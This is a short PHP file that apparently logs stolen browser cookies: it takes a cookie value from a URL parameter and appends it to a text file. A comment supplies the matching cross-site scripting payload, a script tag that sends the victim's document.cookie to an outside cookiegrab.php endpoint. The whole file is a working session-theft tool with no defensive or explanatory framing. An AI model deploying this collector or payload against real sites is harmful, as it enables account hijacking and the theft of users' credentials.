<?php
	$cookie = $_GET["c"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n");
	// <script language="javascript">document.location="https://happi.yt/cookiegrab.php?c="+document.cookie</script>
?>
